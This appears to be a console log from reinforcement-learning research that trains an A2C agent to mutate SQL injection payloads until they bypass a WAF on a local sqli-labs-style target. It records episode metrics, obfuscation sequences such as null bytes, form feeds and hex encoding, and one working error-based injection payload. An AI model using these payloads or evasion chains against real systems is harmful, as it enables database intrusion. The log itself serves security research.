/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 1
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-45.01
  Ep   20 | SR=0% | Steps=15.0 | R=-44.83
  Ep   30 | SR=0% | Steps=15.0 | R=-47.66
  Ep   40 | SR=0% | Steps=15.0 | R=-46.12
  Ep   50 | SR=0% | Steps=15.0 | R=-46.31
  Ep   60 | SR=0% | Steps=15.0 | R=-47.18
  Ep   70 | SR=0% | Steps=15.0 | R=-44.75
  Ep   80 | SR=0% | Steps=15.0 | R=-45.61
  Ep   90 | SR=0% | Steps=15.0 | R=-45.81
  Ep  100 | SR=0% | Steps=15.0 | R=-45.59
  Ep  110 | SR=0% | Steps=15.0 | R=-46.99
  Ep  120 | SR=0% | Steps=15.0 | R=-46.13
  Ep  130 | SR=0% | Steps=15.0 | R=-46.88
  Ep  140 | SR=0% | Steps=15.0 | R=-46.00
  Ep  150 | SR=0% | Steps=15.0 | R=-47.10
  Ep  160 | SR=0% | Steps=15.0 | R=-46.00
  Ep  170 | SR=0% | Steps=15.0 | R=-45.32
  Ep  180 | SR=0% | Steps=15.0 | R=-45.90
  Ep  190 | SR=0% | Steps=15.0 | R=-45.20
  Ep  200 | SR=0% | Steps=15.0 | R=-45.92
  Ep  210 | SR=0% | Steps=15.0 | R=-45.33
  Ep  220 | SR=0% | Steps=15.0 | R=-46.18
  Ep  230 | SR=0% | Steps=15.0 | R=-45.57
  Ep  240 | SR=0% | Steps=15.0 | R=-45.02
  Ep  250 | SR=0% | Steps=15.0 | R=-44.98
  Ep  260 | SR=0% | Steps=15.0 | R=-45.94
  Ep  270 | SR=0% | Steps=15.0 | R=-44.25
  Ep  280 | SR=0% | Steps=15.0 | R=-45.64
  Ep  290 | SR=0% | Steps=15.0 | R=-46.19
  Ep  300 | SR=0% | Steps=15.0 | R=-44.47
  Ep  310 | SR=0% | Steps=15.0 | R=-45.34
  [BYPASS] Ep  319 | steps=8 | seq=null_byte -> formfeed -> char_split -> plus_sep -> url_encode -> ver_newline -> hex_to_char -> func_sp_nbsp
           payload: 1'%0cAND%0cGTID_SUBSET((database%a0()),1);%00  *** NEW SHORTEST ***
  Ep  320 | SR=10% | Steps=14.3 | R=-41.68
  Ep  330 | SR=0% | Steps=15.0 | R=-44.96
  Ep  340 | SR=0% | Steps=15.0 | R=-44.95
  Ep  350 | SR=0% | Steps=15.0 | R=-44.74
  Ep  360 | SR=0% | Steps=15.0 | R=-45.15
  [BYPASS] Ep  370 | steps=5 | seq=func_sp_nbsp -> vtab -> url_encode -> distinct -> null_byte
